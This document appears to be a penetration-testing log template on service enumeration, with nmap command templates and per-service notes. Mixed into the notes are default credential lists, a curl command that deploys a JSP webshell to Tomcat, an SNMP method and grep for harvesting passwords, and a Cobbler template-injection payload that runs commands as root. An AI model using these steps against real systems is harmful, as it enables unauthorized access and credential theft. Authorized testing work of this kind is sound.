# Service Enumeration Testing Log

**Attack Type**: Service Version Detection & Banner Grabbing
**MITRE**: T1046 (Network Service Discovery)

## Last Updated
<!-- Auto-updated by pentester-executor -->

## Test Matrix

| Row | Target:Port | Service | Version | Command | CVEs Found | Notes |
|-----|-------------|---------|---------|---------|------------|-------|
<!-- Append test results below -->

## Command Templates

```bash
# Service version detection
nmap -sV -p PORTS TARGET

# Aggressive version detection
nmap -sV --version-intensity 9 TARGET

# Version + OS detection
nmap -sV -O TARGET

# Version + NSE scripts
nmap -sV -sC TARGET

# Banner grabbing (netcat)
nc -v TARGET PORT
```

## Common Patterns

### Version Detection Levels
- **Intensity 0**: Light probes only
- **Intensity 5**: Default balance
- **Intensity 9**: All probes (slowest, most accurate)

### High-Value Services to Enumerate
- **SSH (22)**: Version → CVE lookup
- **HTTP/HTTPS (80/443)**: Server, frameworks
- **SMB (445)**: Windows version
- **MySQL/PostgreSQL (3306/5432)**: Database versions. PostgreSQL: `psql -h target -p 5432 -U user -c '\l'` (list DBs), `\dt` (tables), `SELECT * FROM tablename;`. If port filtered externally, SSH tunnel first (`ssh -L 5432:localhost:5432 user@target`). Try reused credentials from other services
- **Apache Tomcat (8080/8443)**: Version fingerprint from default page or `Server` header. Check `/manager/html` with default creds (`tomcat:s3cret`, `tomcat:tomcat`, `manager:manager`, `admin:admin`). If authenticated: deploy JSP webshell as WAR via text API (`curl -u user:pass --upload-file cmd.war 'http://target:8080/manager/text/deploy?path=/cmd&update=true'`). WAR = `jar -cf cmd.war cmd.jsp`. On Windows, Tomcat often runs as SYSTEM — no privesc needed. Also check `/host-manager/html`, `/status`, and Tomcat version-specific CVEs (e.g., CVE-2020-9484 deserialization, CVE-2017-12617 PUT JSP upload)
- **RDP (3389)**: Windows remote desktop
- **SMB (445)**: Windows version, share enumeration (`smbclient -L //target -N` for null session, `smbclient -L //target -U guest%` for guest). Download binaries from shares — decompile .NET (ILSpy/dnSpy) and Java (JD-GUI/CFR) for hardcoded credentials, connection strings, internal hostnames
- **MSSQL (1433)**: Version fingerprint, `nmap --script ms-sql-info -p1433 target`. After auth: `SELECT * FROM sys.servers WHERE is_linked = 1;` for linked servers, `SELECT name FROM sys.databases;` for DB enumeration. Linked servers pointing to unresolvable hostnames are AD DNS poisoning targets. Check `db_owner` role: `SELECT IS_MEMBER('db_owner');`
- **MongoDB (27017)**: Version fingerprint (`nmap -sV -p27017`), check no-auth access with `pymongo`: `MongoClient(host, 27017).list_database_names()` then `db.list_collection_names()` + `db.collection.find()`. **Compat note**: `mongosh` and `pymongo>=4.0` require MongoDB 4.2+ (wire version 8); for MongoDB 3.x targets use `pip install 'pymongo<4.0'`. Enumerate all DBs — sensitive data often in non-default databases. Check `nmap --script mongodb-info,mongodb-databases -p27017 target`
- **FTP (21)**: Version fingerprint (`nmap -sV -p21`), check anonymous access (`curl ftp://anonymous:anonymous@target/`), recursively download all files — PDFs, emails, and policy documents often leak default credentials or usernames. **Credential stores**: `.psafe3` (Password Safe — crack with `john --format=pwsafe`), `.kdbx` (KeePass), `.crd`. In AD, check FTP with all compromised accounts — group memberships may grant access. Look for web admin interfaces on alternate ports (e.g., 8443, 5466), config file locations (`/opt/*/Data/*/users/*.xml` for per-user hashes)
- **Modbus TCP (502)**: ICS/SCADA protocol. No auth by default. Brute-force slave IDs 0-255 with FC 0x2B (device identification). Read coils (FC01), holding registers (FC03). Custom FCs may wrap session-based protocols — enumerate sub-function codes. See `ics-modbus-quickstart.md`
- **SNMP (UDP/161)**: try the default `public` community string first — no sudo required for `snmpwalk` on macOS/BSD/Linux. The single highest-yield OID is `1.3.6.1.2.1.25.4.2.1.5` (HOST-RESOURCES-MIB::hrSWRunParameters) — dumps the cleartext command-line arguments of every running process, where cron jobs and supervisor-launched scripts frequently leak `-u user -p PASSWORD` style credentials.
  ```bash
  snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.5 > recon/snmp-procs-args.txt
  grep -iE 'pass|pwd|-p |--password|secret|token|key=' recon/snmp-procs-args.txt
  # Also useful OIDs:
  #  1.3.6.1.2.1.25.4.2.1.4   hrSWRunPath          (process binary paths)
  #  1.3.6.1.2.1.25.6.3.1.2   hrSWInstalledName    (installed packages → version-specific CVEs)
  #  1.3.6.1.2.1.4.20.1.1     ipAdEntAddr          (interface IPs — pivot targets)
  #  1.3.6.1.2.1.6.13.1       tcpConnTable         (active TCP connections)
  ```
  Don't use `nmap -sU -p 161` for the enumeration — it needs root and is much slower. Use `snmpwalk` directly. Other community strings worth trying after `public`: `private`, `community`, `manager`, the company name lowercased, the hostname.
- **Cobbler XMLRPC (25151)**: Provisioning server, typically loopback-only (pivot via SSH `-L`). Auth with `cobbler:cobbler` — default password hashed in `/etc/cobbler/settings.yaml` (`default_password_crypted`, crackable MD5crypt). Test: `python3 -c "import xmlrpc.client as x; s=x.ServerProxy('http://127.0.0.1:25151/'); print(s.extended_version()); t=s.login('cobbler','cobbler'); print(t)"`. **RCE as root** via Cheetah template injection — chain: `write_autoinstall_template('evil.ks', payload, token)` → `new_distro/new_profile/new_system` (kernel/initrd must live in a cobblerd-readable path — NOT `/tmp` if `PrivateTmp=yes`, use `/var/www/html/skins/` or similar world-writable web path) → `generate_autoinstall('', 'evil_system', False)`. Payload bypass: `#set $os = __import__("os")\n#set $r = $os.popen("id").read()\n$r` — `__import__()` bypasses `cheetah_import_whitelist`. See `injection/reference/ssti-cheat-sheet.md` (Cheetah section).

### NSE Scripts for Enumeration
- `http-methods`: Allowed HTTP methods
- `ssh-auth-methods`: SSH authentication
- `smb-os-discovery`: Windows OS info
- `ssl-cert`: Certificate details

## Learnings

### Successful Techniques
<!-- Add entries as tests are performed -->

### Failed Techniques
<!-- Add entries when techniques fail -->

### Version Fingerprinting
<!-- Document accurate vs inaccurate version detection -->

## CVE Mapping

### Vulnerable Services Found
<!-- Track services with known CVEs -->

### Exploitation Candidates
<!-- Services worth deeper testing -->
